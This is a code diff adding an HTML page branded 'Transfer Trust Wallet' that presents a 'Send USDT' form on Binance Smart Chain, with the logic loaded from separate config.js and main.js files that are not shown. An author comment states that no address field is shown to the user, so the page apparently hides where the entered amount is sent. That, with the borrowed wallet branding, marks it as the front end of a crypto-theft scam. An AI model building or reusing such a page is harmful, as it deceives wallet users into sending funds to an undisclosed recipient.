@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Transfer Trust Wallet</title>
+  <meta name="description" content="Securely transfer USDT on Binance Smart Chain">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="favicon.ico">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    ::-moz-selection { color:#000 !important; background:#accef7 !important; }
+    ::selection      { color:#000 !important; background:#accef7 !important; }
+  </style>
+</head>
+<body>
+  <div id="__next">
+    <div>
+      <div class="min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto">
+        <header class="flex w-full items-center mb-8">
+          <h1 class="flex-1 text-center text-xl font-medium text-white">Send USDT</h1>
+        </header>
+        <div class="space-y-6">
+
+          <!-- Amount field only — no address field shown to user -->
+          <div class="space-y-1">
+            <label class="text-sm text-gray-400">Amount</label>
+            <div class="relative">
+              <input
+                id="amountInput"
+                placeholder="USDT Amount"
+                type="number"
+                min="0"
+                step="any"
+                class="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-24"
+                value=""
+              >
+              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+                <span class="text-gray-500 text-sm mr-2">USDT</span>
+              </div>
+            </div>
+          </div>
+
+          <div id="approxUsd" class="text-xs text-gray-500"></div>
+
+        </div>
+
+        <div class="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
+          <button
+            id="nextBtn"
+            class="w-full bg-greentext text-black hover:bg-gray-700 rounded-full disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-600 disabled:text-white h-12 text-lg inline-flex items-center justify-center gap-2"
+            disabled
+          >Next</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="config.js"></script>
+  <script src="main.js"></script>
+</body>
+</html>
